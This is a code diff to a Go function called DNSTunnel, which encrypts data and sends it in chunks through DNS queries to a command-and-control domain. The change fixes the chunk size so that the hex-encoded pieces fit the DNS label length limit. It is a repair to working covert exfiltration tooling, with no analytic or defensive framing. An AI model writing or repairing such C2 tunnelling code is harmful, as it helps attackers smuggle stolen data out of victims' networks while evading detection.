@@ -94,9 +94,10 @@ func DNSTunnel(ctx context.Context, data []byte, c2Domain string) ([]byte, error
 		return nil, fmt.Errorf("DNS tunnel encrypt: %w", err)
 	}
 
-	// Split into 32-byte hex-encoded chunks
+	// Split into 31-byte chunks: hex-encoded that is 62 chars, under
+	// the 63-char DNS label limit (32 bytes encoded to 64 and broke).
 	// (nonce is prepended, so first chunks carry the nonce — server reassembles before decrypt)
-	const chunkSize = 32
+	const chunkSize = 31
 	var responses []byte
 
 	for i := 0; i < len(encrypted); i += chunkSize {
